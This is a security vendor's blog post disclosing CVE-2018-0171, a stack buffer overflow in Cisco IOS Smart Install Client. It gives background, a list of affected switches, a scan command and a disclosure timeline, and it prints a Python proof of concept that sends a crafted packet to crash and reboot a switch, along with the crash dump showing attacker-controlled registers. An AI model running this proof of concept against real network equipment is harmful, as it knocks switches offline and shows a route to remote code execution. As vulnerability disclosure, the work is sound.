
<!DOCTYPE html>
<html lang="en-US">
<head>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-99022739-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-99022739-1');
    </script> 
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">  
	<meta property="og:site_name" content="Embedi" />
<meta property="og:url" content="https://embedi.com/blog/cisco-smart-install-remote-code-execution/" />
<link rel="canonical" href="https://embedi.com/blog/cisco-smart-install-remote-code-execution/" />
<meta property="og:title" content="Cisco Smart Install Remote Code Execution" />
<meta property="og:description" content="Introduction Application: Cisco IOS, Cisco IOS-XE Vendor: Cisco Bugs: Stack-based buffer overflow [CWE-20], [CWE-121] Risk: Critical; AV:N/AC:L/Au:N/C:C/I:C/A:C (10.0) A stack-based buffer overflow vulnerability was found in Smart Install Client code. This vulnerability enables an attacker to remotely execute arbitrary code without authentication. So it allows getting full control over a vulnerable network equipment. Smart Install [&hellip;]" />
<meta property="og:type" content="article" />
<meta property="og:image" content="https://embedi.com/wp-content/uploads/2018/03/main.jpg" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:url" content="https://embedi.com/blog/cisco-smart-install-remote-code-execution/" />
<meta name="twitter:title" content="Cisco Smart Install Remote Code Execution" />
<meta name="twitter:description" content="Introduction Application: Cisco IOS, Cisco IOS-XE Vendor: Cisco Bugs: Stack-based buffer overflow [CWE-20], [CWE-121] Risk: Critical; AV:N/AC:L/Au:N/C:C/I:C/A:C (10.0) A stack-based buffer overflow vulnerability was found in Smart Install Client code. This vulnerability enables an attacker to remotely execute arbitrary code without authentication. So it allows getting full control over a vulnerable network equipment. Smart Install [&hellip;]" />
<meta name="twitter:image" content="https://embedi.com/wp-content/uploads/2018/03/main.jpg" />

            <link rel="icon" href="https://embedi.com/favicon.ico" type="image/x-icon">
        
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Cisco Smart Install Remote Code Execution &#8211; Embedi</title>
<link rel='dns-prefetch' href='//embedi.com' />
<link rel='stylesheet' id='contact-form-7-css'  href='https://embedi.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='dlm-frontend-css'  href='https://embedi.com/wp-content/plugins/download-monitor/assets/css/frontend.css?ver=4.9.5' type='text/css' media='all' />
<link rel='stylesheet' id='icomoon-css'  href='https://embedi.com/wp-content/themes/embedicom/public/icomoon/style.css?ver=1521105094' type='text/css' media='all' />
<link rel='stylesheet' id='libs-css'  href='https://embedi.com/wp-content/themes/embedicom/public/css/libs.css?ver=1522921960' type='text/css' media='all' />
<link rel='stylesheet' id='style-css'  href='https://embedi.com/wp-content/themes/embedicom/style.css?ver=1522921960' type='text/css' media='all' />
<script type='text/javascript' src='https://embedi.com/wp-content/themes/embedicom/bower_components/jquery/dist/jquery.min.js?ver=4.9.5'></script>
<link rel='https://api.w.org/' href='https://embedi.com/wp-json/' />
<link rel="alternate" type="application/json+oembed" href="https://embedi.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fembedi.com%2Fblog%2Fcisco-smart-install-remote-code-execution%2F" />
    
    
    <script>
        (function(h,o,t,j,a,r){
            h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
            h._hjSettings={hjid:828920,hjsv:6};
            a=o.getElementsByTagName('head')[0];
            r=o.createElement('script');r.async=1;
            r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
            a.appendChild(r);
        })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
    </script>
</head>



<body class=" menu_dark">
    <div class="wrapper">   
        <header id="header">
            <div class="container">
                <div class="header-mobile-logo">
                    <div class="navbar-header__logo">
                        
                                <a href="https://embedi.com">
                                    <svg viewBox="0 0 530 100">
                                        <path class="navbar-header__logo-path"
                                              d="M 0,0 16.724609,16.724609 H 83.044921 V 0 Z m 98.501953,0 v 23.298828 l 50.058587,50.28711 33.2168,-33.486329 V 100 h 16.72461 V 0 l -49.94141,49.824219 z m 115.457027,0 16.60938,16.724609 h 37.48632 c 6.85832,-1e-6 12.45508,5.653546 12.45508,12.457032 0,6.803486 -5.59675,12.457031 -12.45508,12.457031 H 230.56836 V 49.943359 58.25 h 37.48632 c 6.85832,0 12.45508,5.651597 12.45508,12.455078 0,6.803486 -5.59675,12.570313 -12.45508,12.570313 H 230.56836 L 213.95898,100 h 54.21094 c 15.89255,0 29.06445,-13.013676 29.06445,-29.292969 0,-8.293994 -2.98982,-15.207043 -8.85742,-20.625 -0.007,-0.0069 -0.0165,-0.01455 -0.0234,-0.02148 l -0.11718,-0.117188 0.11718,-0.117187 c 0.007,-0.0069 0.016,-0.01262 0.0234,-0.01953 5.8676,-5.417955 8.85742,-12.332945 8.85742,-20.626953 C 297.23441,12.9004 284.06247,0 268.16992,0 Z m 98.73242,0 16.72461,16.724609 h 66.32032 V 0 Z m 98.50196,0 16.60937,16.724609 h 16.60938 c 18.30808,0 33.21093,14.871246 33.21093,33.21875 0,18.347504 -14.90285,33.332032 -33.21093,33.332032 H 427.80273 L 411.19336,100 h 33.21875 c 27.55916,-5e-6 49.93164,-22.423173 49.93164,-50.056641 C 494.34375,22.309891 471.97127,4.7998746e-6 444.41211,0 Z m 98.73047,0 v 100 h 16.72461 V 16.724609 Z M 16.724609,41.638672 V 58.248047 H 83.044921 V 41.638672 Z m 312.691401,0 v 16.609375 h 66.32032 V 41.638672 Z M 16.724609,83.275391 0,100 H 83.044921 V 83.275391 Z m 312.691401,0 L 312.6914,100 h 83.04493 V 83.275391 Z"
                                        />
                                    </svg>
                                </a>

                                                </div>
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#primary_nav">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                </div>
                <nav id="primary_nav" class="menu collapse navbar-collapse"><ul id="menu-top-menu" class="menu__list"><li id="menu-item-4" class="dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4"><a>Solutions</a>
<ul class="sub-menu">
	<li id="menu-item-129" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-129"><a href="https://embedi.com/solutions/embedi-antiexploit/">Embedi AntiExploit</a></li>
	<li id="menu-item-130" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-130"><a href="https://embedi.com/solutions/embedi-webguard/">Embedi WebGuard</a></li>
</ul>
</li>
<li id="menu-item-168" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-168"><a href="https://embedi.com/blog/">Blog</a></li>
<li id="menu-item-1075" class="dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1075"><a>Press Center</a>
<ul class="sub-menu">
	<li id="menu-item-187" class="dropdown menu-item menu-item-type-post_type menu-item-object-page menu-item-187"><a href="https://embedi.com/news/">Our news</a></li>
	<li id="menu-item-1074" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1074"><a href="https://embedi.com/in-the-news/">In the News</a></li>
</ul>
</li>
<li id="menu-item-189" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-189"><a href="https://embedi.com/resources/">Resources</a></li>
<li id="menu-item-91" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-91"><a href="https://embedi.com/about/">About</a></li>
<li id="menu-item-13" class="softscroll menu-item menu-item-type-custom menu-item-object-custom menu-item-13"><a href="#contact-form-anchor">Contact us</a></li>
</ul></nav>
            </div>
        </header>


    <div class="container breadcrumbs">
		<ul id="new-breadcrumbs" class="new-breadcrumbs"><li class="item-home"><a class="bread-link bread-home" href="https://embedi.com" title="Home">Home</a></li><li class="separator separator-home"> / </li><li class="item-current item-cat"><a href="https://embedi.com/blog">Blog</a></li><li class="separator"> / </li><li class="item-cat"><a href="https://embedi.com/blog/categories/research/">Research</a></li><li class="separator"> / </li><li class="item-current item-1292"><h1 class="bread-current bread-1292" title="Cisco Smart Install Remote Code Execution">Cisco Smart Install Remote Code Execution</h1></li></ul>    </div>

    <section id="content">
        <div class="container">
            <div class="row">
				

    
    <div class="col-xs-12 col-md-3 sidebar">
        <aside class="sidebar__container">
            <h3 class="sidebar__title">Categories:</h3>
            <ul class="sidebar__list sidebar__list_arrow">
				<li class="sidebar__list__item"><span class="icon-blog_arrow_green"></span><a href="https://embedi.com/blog/categories/analytics/" rel="tag">Analytics</a></li><li class="sidebar__list__item"><span class="icon-blog_arrow_green"></span><a href="https://embedi.com/blog/categories/research/" rel="tag">Research</a></li>            </ul>

            <h3 class="sidebar__title">Tags:</h3>
            <ul class="sidebar__list sidebar__list_tags">
				<li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/atm/" rel="tag">ATM</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/cisco/" rel="tag">CISCO</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/cybersecurity/" rel="tag">cybersecurity</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/d-link/" rel="tag">D-Link</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/dji/" rel="tag">DJI</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/exploitation/" rel="tag">exploitation</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/firmware-security/" rel="tag">firmware-security</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/hardware/" rel="tag">hardware</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/hijacking/" rel="tag">hijacking</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/intel/" rel="tag">intel</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/microsoft/" rel="tag">Microsoft</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/mobile/" rel="tag">mobile</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/office/" rel="tag">Office</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/rce/" rel="tag">RCE</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/router/" rel="tag">router</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/scada/" rel="tag">SCADA</a></li><li class="sidebar__list__item"><a href="https://embedi.com/blog/tags/vulnerabilities/" rel="tag">vulnerabilities</a></li>            </ul>

            <h3 class="sidebar__title">Popular articles:</h3>
            <ul class="sidebar__list sidebar__list_arrow">
	                                        <li class="sidebar__list__item">
                                <a href="https://embedi.com/blog/killchain-iot-devices-part-2/">Killchain of IoT Devices. Part 2</a>
                            </li>
                                                    <li class="sidebar__list__item">
                                <a href="https://embedi.com/blog/killchain-iot-devices-part-1/">Killchain of IoT Devices. Part 1</a>
                            </li>
                                    </ul>
        </aside>
    </div>


                <div class="col-xs-12 col-md-9 news-block">
                    <div class="news__container">
                        <div class="news-item">
                            <div class="news-item__date">29 March, 2018</div>
                            <h1 class="news-item__title news-item__title_single">
								Cisco Smart Install Remote Code Execution                            </h1>
                            <div class="news-item__image js-image-change">
                                <img data-src="https://embedi.com/wp-content/uploads/2018/03/main.jpg" alt="">
                            </div>

                            <div class="news-item__categories">
								<a href="https://embedi.com/blog/categories/research/" rel="category tag">Research</a>                            </div>

							
                                <div class="news-item__tags">
									<a href="https://embedi.com/blog/tags/cisco/" rel="tag">CISCO</a>, <a href="https://embedi.com/blog/tags/exploitation/" rel="tag">exploitation</a>, <a href="https://embedi.com/blog/tags/rce/" rel="tag">RCE</a>, <a href="https://embedi.com/blog/tags/vulnerabilities/" rel="tag">vulnerabilities</a>                                </div>

								
                            <div class="editor-output">
								<h2>Introduction</h2>

<ul>
<li><strong>Application:</strong> Cisco IOS, Cisco IOS-XE</li>
<li><strong>Vendor:</strong> <a href="http://www.cisco.com">Cisco</a></li>
<li><strong>Bugs:</strong> Stack-based buffer overflow <a href="https://cwe.mitre.org/data/definitions/20.html">[CWE-20]</a>, <a href="https://cwe.mitre.org/data/definitions/121.html">[CWE-121]</a> </li>
<li><strong>Risk</strong>: Critical; AV:N/AC:L/Au:N/C:C/I:C/A:C (10.0)</li>
</ul>

<p>A stack-based buffer overflow vulnerability was found in <code>Smart Install Client</code> code. This vulnerability enables an attacker to remotely execute arbitrary code without authentication. So it allows getting full control over a vulnerable network equipment.</p>

<p><code>Smart Install</code> is a plug-and-play configuration and image-management feature that provides zero-touch deployment for new switches. It automates the process of initial configuration and the loading of the current operating system image for a new network switch. This means that you can ship a switch to a location, place it in the network and power it on with no configuration on the device required and without an administrator. The technology also provides a backup of the configuration when it changes and hot-swapping broken equipment.</p>

<p>A network using <code>Smart Install</code> includes a group of network devices, known as <code>clients</code>, that are served by a common <code>Layer 3</code> switch or router that acts as a director.  </p>

<p><img src="/wp-content/uploads/2018/03/typical_smart_install_network_big.png" alt="Smart Install Network"></p>

<p>The <code>director</code> provides a single management point for images and configuration of client switches. Client switches have a direct or indirect connection to the director so that they can receive image and configuration downloads from it.</p>

<p>More information about the <code>Smart Install</code> technology can be found in the official <a href="https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html">documentation</a>.</p>

<p>The vulnerability is located right in the code of <code>Smart Install Client</code>.</p>

<p>It is important to note that the technology requires that it be enabled on clients by default. This fact affects the coverage and impact of the vulnerability, but more on this below.</p>

<h2>Vulnerability Description</h2>

<p>The <code>SMI IBC Server Process</code> process contains a <code>Smart Install Client</code> implementation code. The <code>Smart Install Client</code> starts a server on the <code>TCP(4786)</code> port (opened by default) to interact with the <code>Smart Install Director</code>.</p>

<p>When this server is processing a specially crafted malicious message <code>ibd_init_discovery_msg</code> a stack-based buffer overflow occurs.</p>

<p>To be more precise, the buffer overflow takes place in the function <code>smi_ibc_handle_ibd_init_discovery_msg</code></p>

<p><img src="/wp-content/uploads/2018/03/smi_ibc_handle_ibd_init_discovery_msg.png" alt="Vulnerable Function CFG"></p>

<p>because the size of the data copied to a fixed-size buffer is not checked. The size and data are taken directly from the network packet and are controlled by an attacker.</p>

<h2>GeekPWN 2017 Hong Kong</h2>

<p>This vulnerability won the <code>G-Influence</code> award at <a href="http://2017.geekpwn.org/512/en/index.html">GeekPWN 2017 Hong-Kong</a> after its successful exploitation had been demonstrated.</p>

<blockquote>
<p>About GeekPwn.
As one of the world’s leading platforms for cyber-security researchers, GeekPwn enables security researchers and executives around the world to share their thoughts and findings. Since 2014, GeekPwn has successfully held 8 sessions in Beijing, Shanghai, Macau, Hong Kong and Silicon Valley, and responsibly disclosed hundreds of critical security vulnerabilities and awarded over millions (USD) to contestants.</p>
</blockquote>

<p>Under the terms of the contest, it was necessary to attack the <code>Cisco Catalyst 2960</code> switch and fulfill two conditions:</p>

<ol>
<li><p>Reset or change the <code>enable</code> password to enter privileged EXEC mode:</p>

<p>
<div class="embed-video"><iframe class="embed-video__iframe" src="https://www.youtube.com/embed/CE7KNK6UJuk?rel=0" frameborder="0" allowfullscreen></iframe></div></p>
</li>
<li><p>Intercept traffic between other devices connected to the switch and the Internet:</p>

<p><div class="embed-video"><iframe class="embed-video__iframe" src="https://www.youtube.com/embed/TSg5EZVudNU?rel=0" frameborder="0" allowfullscreen></iframe></div></p>
</li>
</ol>

<p>More details on the techniques and methods used to create the exploit for this vulnerability can be found in our research <a href="https://embedi.com/blog/how-cook-cisco/">&#8220;How To Cook Cisco&#8221;</a>.</p>

<h2>How to check the equipments for vulnerability</h2>

<p>If you have a Cisco network equipment with an open <code>TCP 4786</code> port, it is vulnerable. In order to find such equipment, simply scan your network.</p>

<pre><code class="bash">nmap -p T:4786 192.168.1.0/24
</code></pre>

<p>To check whether the network equipment is of a <code>Smart Install Client</code> type, enter the following commands:</p>

<pre><code>switch&gt;show vstack config
 Role: Client (SmartInstall enabled)
 Vstack Director IP address: 0.0.0.0

switch&gt;show tcp brief all
TCB       Local Address           Foreign Address        (state)
0344B794  *.4786                  *.*                    LISTEN
0350A018  *.443                   *.*                    LISTEN
03293634  *.443                   *.*                    LISTEN
03292D9C  *.80                    *.*                    LISTEN
03292504  *.80                    *.*                    LISTEN
</code></pre>

<h2>Internet scan results</h2>

<p>After the vulnerability was discovered, we decided that it could only be used for attacks inside an enterprise network. Because in a securely configured network, <code>Smart Install</code> technology participants should not be accessible through the Internet.</p>

<p>But scanning the Internet has shown that this is not true. </p>

<p>During a short scan of the Internet, we detected 250,000 vulnerable devices and 8,5 million devices that have a vulnerable port open.</p>

<p>Probably, this happens because on <code>Smart Install</code> clients the port <code>TCP(4786)</code> is opened by default and network administrators do not notice this somehow.</p>

<h2>Affected Hardware/Software</h2>

<p><img src="/wp-content/uploads/2018/03/Cisco_Catalyst_Series_Switches.png" alt="Cisco_Catalyst_Series_Switches"></p>

<p>The vulnerability was checked on the following devices: <code>Catalyst 4500 Supervisor Engines</code>, <code>Cisco Catalyst 3850 Series Switches</code>, and <code>Cisco Catalyst 2960 Series Switches</code>.</p>

<ul>
<li>Cisco Catalyst 4500 Supervisor Engine 6L-E

<ul>
<li>Cisco IOS 15.2.2E6 (Latest, Suggested)

<ul>
<li><code>cat4500e-entservicesk9-mz.152-2.E6.bin</code> (23-DEC-2016)</li>
</ul></li>
</ul></li>
<li>Cisco Catalyst 2960-48TT-L Switch

<ul>
<li>Cisco IOS 12.2(55)SE11 (Suggested)

<ul>
<li><code>c2960-lanbasek9-mz.122-55.SE11.bin</code> (18-AUG-2016)</li>
</ul></li>
<li>Cisco IOS 15.0.2-SE10a (Latest)

<ul>
<li><code>c2960-lanbasek9-mz.150-2.SE10a.bin</code> (10-NOV-2016)</li>
</ul></li>
</ul></li>
<li>Cisco Catalyst 3850-24P-E Switch

<ul>
<li>Cisco IOS-XE 03.03.05.SE

<ul>
<li><code>cat3k_caa-universalk9.SPA.03.03.05.SE.150-1.EZ5.bin</code> (03-NOV-2014)</li>
</ul></li>
</ul></li>
</ul>

<p>Moreover, all devices that may fall into the Smart Install Client type are potentially vulnerable. Here is a list of them:</p>

<ul>
<li>Catalyst 4500 Supervisor Engines</li>
<li>Catalyst 3850 Series</li>
<li>Catalyst 3750 Series</li>
<li>Catalyst 3650 Series</li>
<li>Catalyst 3560 Series</li>
<li>Catalyst 2960 Series</li>
<li>Catalyst 2975 Series</li>
<li>IE 2000</li>
<li>IE 3000</li>
<li>IE 3010</li>
<li>IE 4000</li>
<li>IE 4010</li>
<li>IE 5000</li>
<li>SM-ES2 SKUs</li>
<li>SM-ES3 SKUs</li>
<li>NME-16ES-1G-P</li>
<li>SM-X-ES3 SKUs</li>
</ul>

<p>For more information, please, check:</p>

<ul>
<li><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2#fixed">Cisco Security Advisory</a></li>
<li><a href="http://cfn.cloudapps.cisco.com/ITDIT/CFN/jsp/index.jsp">Cisco Feature Navigator</a></li>
<li><a href="https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/supported_devices.html#51890">Supported Devices for Smart Install</a></li>
</ul>

<h2>Proof of Concept</h2>

<p>The following is a listing of PoC for the vulnerability:</p>

<pre><code class="python"># smi_ibc_init_discovery_BoF.py

import socket 
import struct 
from optparse import OptionParser 

# Parse the target options 
parser = OptionParser() 
parser.add_option("-t", "--target", dest="target", help="Smart Install Client", default="192.168.1.1")  parser.add_option("-p", "--port", dest="port", type="int", help="Port of Client", default=4786)  (options, args) = parser.parse_args() 

def craft_tlv(t, v, t_fmt='!I', l_fmt='!I'): 
    return struct.pack(t_fmt, t) + struct.pack(l_fmt, len(v)) + v 

def send_packet(sock, packet): 
    sock.send(packet)   

def receive(sock):  
    return sock.recv() 

if __name__ == "__main__": 

    print "[*] Connecting to Smart Install Client ", options.target, "port", options.port 

    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    con.connect((options.target, options.port)) 

    payload = 'BBBB' * 44  shellcode = 'D' * 2048 

    data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload 

    tlv_1 = craft_tlv(0x00000001, data)  tlv_2 = shellcode 

    hdr =  '\x00\x00\x00\x01'                                   # msg_from
    hdr += '\x00\x00\x00\x01'                                   # version
    hdr += '\x00\x00\x00\x07'                                   # msg_hdr_type
    hdr += struct.pack('>I', len(data))                         # data_length

    pkt = hdr + tlv_1 + tlv_2 

    print "[*] Send a malicious packet"  
    send_packet(con, pkt)
</code></pre>

<p>To attack the switch, run the command below:</p>

<pre><code class="bash">host$ ./smi_ibc_init_discovery_BoF.py  -t 192.168.1.1
</code></pre>

<p>Switch should print a crash info and reboot:</p>

<pre><code> 00:10:35 UTC Mon Mar 1 1993: Unexpected exception to CPUvector 1200, PC = 42424240
-Traceback= 42424240
Writing crashinfo to flash:/crashinfo_ext/crashinfo_ext_15
=== Flushing messages (00:10:39 UTC Mon Mar 1 1993) === Buffered messages:
...
Queued messages:
Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE11, RELEASE SOFTWARE
(fc3)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2016 by Cisco Systems, Inc.
Compiled Wed 17-Aug-16 13:46 by prod_rel_team
Instruction TLB Miss Exception (0x1200)!
SRR0 = 0x42424240  SRR1 = 0x00029230  SRR2 = 0x0152ACE4  SRR3 = 0x00029230
ESR = 0x00000000  DEAR = 0x00000000  TSR = 0x84000000  DBSR = 0x00000000
CPU Register Context:
Vector = 0x00001200  PC = 0x42424240  MSR = 0x00029230  CR = 0x33000053
LR = 0x42424242  CTR = 0x014D5268  XER = 0xC000006A
R0 = 0x42424242  R1 = 0x02B1B0B0  R2 = 0x00000000  R3 = 0x032D12B4
R4 = 0x000000B6  R5 = 0x0000001E  R6 = 0xAA3BEC00  R7 = 0x00000014
R8 = 0x0000001E  R9 = 0x00000000  R10 = 0x001BA800  R11 = 0xFFFFFFFF
R12 = 0x00000000  R13 = 0x00110000  R14 = 0x0131E1A8  R15 = 0x02B1B1A8
R16 = 0x02B1B128  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x02B1B128
R20 = 0x02B1B128  R21 = 0x00000001  R22 = 0x02B1B128  R23 = 0x02B1B1A8
R24 = 0x00000001  R25 = 0x00000000  R26 = 0x42424242  R27 = 0x42424242
R28 = 0x42424242  R29 = 0x42424242  R30 = 0x42424242  R31 = 0x42424242
Stack trace:
PC = 0x42424240, SP = 0x02B1B0B0
Frame 00: SP = 0x42424242    PC = 0x42424242
</code></pre>

<h2>Diclosure Timeline</h2>

<ul>
<li><p><strong>13/05/2017</strong> &#8211; The vulnerability was presented at the <a href="http://2017.geekpwn.org/512/en/index.html">GeekPWN 2017 Hong-Kong</a>. Under the terms of the competition, interaction with the vendor for fixing the vulnerability is the right and responsibility of the GeekPWN organizers.</p></li>
<li><p><strong>26/09/2017</strong> &#8211; We informed the vendor about our planned talk <a href="https://embedi.com/wp-content/uploads/dlm_uploads/2018/03/Ekoparty-2018-How-To-Cook-Cisco-Exploit-Development-For-Cisco-IOS.pdf">&#8220;How to cook Cisco. The exploit development for Cisco IOS&#8221;</a> at the <a href="https://www.ekoparty.org">EKOPARTY 2017</a> conference and clarified the planned date of disclosure of the vulnerability. Vendor&#8217;s response is below:</p>

<p><img src="/wp-content/uploads/2018/03/cisco_response.jpg" alt=""></p></li>
<li><p><strong>28/03/2018</strong> – Final fix. The advisory <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2">cisco-sa-20180328-smi2</a> was published. And <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-0171">CVE-2018-0171</a> assigned.</p></li>
<li><p><strong>28/03/2018</strong> – Blog article posted.</p></li>
</ul>
                            </div>
                                                    </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

<section id="share-buttons">
    <div class="container">
        <div class="share-button share-button_fb">
            <a href="" onclick="return fbs_click(512, 436)" target="_blank" title="Share on Facebook">
            </a>
            <span data-shares="" class="share-counter facebook-counter"></span>
        </div>

        <div class="share-button share-button_in">
            <a class="share-in" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://embedi.com/blog/cisco-smart-install-remote-code-execution/&amp;title=Cisco Smart Install Remote Code Execution" target="_blank" title="Share on LinkedIn">
            </a>
            <span class="share-counter linkedin-counter"></span>
        </div>

        <div class="share-button share-button_tw">
            <a class="share-tw" href="http://www.twitter.com/intent/tweet?url=https://embedi.com/blog/cisco-smart-install-remote-code-execution/&amp;text=Cisco Smart Install Remote Code Execution" target="_blank" title="Share on Twitter">
            </a>
            <span class="share-counter twitter-counter"></span>
        </div>
    </div>
</section>
            <footer id="footer">
                <svg preserveAspectRatio="none" class="triangle triangle_top triangle_footer" viewBox="0 0 1 1">
                    <polygon points="0,0 1,0 0,1"/>
                </svg>
                <div class="container">
                    <div class="row subscribe-form">
                        <div class="subscribe-form__flex col-xs-12">
                            <p class="subscribe-form__title">Subscribe to our newsletter to stay in touch</p>
	                        <div role="form" class="wpcf7" id="wpcf7-f223-p1292-o1" lang="en-US" dir="ltr">
<div class="screen-reader-response"></div>
<form action="/blog/cisco-smart-install-remote-code-execution/#wpcf7-f223-p1292-o1" method="post" class="wpcf7-form contact-form contact-form-js subscribe-form__container mailchimp-ext-0.4.50" novalidate="novalidate">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="223" />
<input type="hidden" name="_wpcf7_version" value="5.0.1" />
<input type="hidden" name="_wpcf7_locale" value="en_US" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f223-p1292-o1" />
<input type="hidden" name="_wpcf7_container_post" value="1292" />
</div>
<div class="subscribe-form__email contact-form-validate">
    <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email js-footer-input" aria-required="true" aria-invalid="false" placeholder="Enter your email here" /></span>
</div>
<div class="subscribe-form__submit">
    <button class="submit-btn contact-form__submit-js contact-form__submit" type="submit">Submit</button>
</div>
<p><input type="hidden" name="bwp-recaptcha-widget-id" value="bwpRecaptchaWidget1" /><div id="bwp-recaptcha-3fcdb73d36d54f2cc22d0f68e6b6e182" class="bwp-recaptcha g-recaptcha" ></div><span class="wpcf7-form-control-wrap recaptcha-830"><input type="hidden" name="recaptcha-830-dummy" /></span></p>
<div class="wpcf7-response-output wpcf7-display-none"></div><p style="display: none !important"><span class="wpcf7-form-control-wrap referer-page"><input type="hidden" name="referer-page" value="https://t.co/DfHtTn0EOh?amp=1" class="wpcf7-form-control wpcf7-text referer-page" aria-invalid="false"></span></p>
</form></div>                        </div>
                    </div>

                    <div class="row footer-menu">
	                    <nav class="footer-menu"><ul id="menu-footer-menu" class="footer-menu__list"><li id="menu-item-213" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-213"><a href="https://embedi.com/solutions/">Solutions</a></li>
<li id="menu-item-209" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-209"><a href="https://embedi.com/blog/">Blog</a></li>
<li id="menu-item-210" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-210"><a href="https://embedi.com/news/">Our news</a></li>
<li id="menu-item-208" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-208"><a href="https://embedi.com/resources/">Resources</a></li>
<li id="menu-item-207" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-207"><a href="https://embedi.com/about/">About</a></li>
</ul></nav>                    </div>

                    <div class="row footer-socials">
                        <div class="soc-btn">
                            <a href="https://www.facebook.com/Embedi/" target="_blank" title="Facebook">
                                <span class="icon-fb"></span>
                            </a>
                        </div>
                        <div class="soc-btn">
                            <a href="https://www.linkedin.com/company/embedi" target="_blank" title="LinkedIn">
                                <span class="icon-in"></span>
                            </a>
                        </div>
                        <div class="soc-btn">
                            <a href="https://twitter.com/_embedi_" target="_blank" title="Twitter">
                                <span class="icon-tw"></span>
                            </a>
                        </div>
                        <div class="soc-btn">
                            <a href="https://github.com/embedi/" target="_blank" title="GitHub">
                                <span class="icon-git"></span>
                            </a>
                        </div>
                        <div class="soc-btn">
                            <a href="https://www.youtube.com/channel/UC9XR2noZynNxvQcg0G9ooKA" target="_blank" title="YouTube">
                                <span class="icon-youtube-play-button"></span>
                            </a>
                        </div>
                    </div>

                    <div class="row footer-copyright">
                        <p>2016 - 2018 &copy;</p>
                    </div>
                </div>
            </footer>
        </div> 

            <div class="modal fade contact-form-modal contact-form-getfile-js" tabindex="-1" role="dialog">
            <div class="modal-dialog container" role="document">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span class="icon-regular-close"></span>
                </button>
                <h2 class="section__title">Download request</h2>
                <div role="form" class="wpcf7" id="wpcf7-f257-p1292-o2" lang="en-US" dir="ltr">
<div class="screen-reader-response"></div>
<form action="/blog/cisco-smart-install-remote-code-execution/#wpcf7-f257-p1292-o2" method="post" class="wpcf7-form contact-form contact-form-js mailchimp-ext-0.4.50" novalidate="novalidate">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="257" />
<input type="hidden" name="_wpcf7_version" value="5.0.1" />
<input type="hidden" name="_wpcf7_locale" value="en_US" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f257-p1292-o2" />
<input type="hidden" name="_wpcf7_container_post" value="1292" />
</div>
<p class="dark-text">In order to receive a link to download the file, please leave your email. The link will be sent immediately</p>
<p><br></p>
<div class="contact-form-validate">
   <span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email contact-form__input" aria-required="true" aria-invalid="false" placeholder="E-mail address?" /></span>
</div>
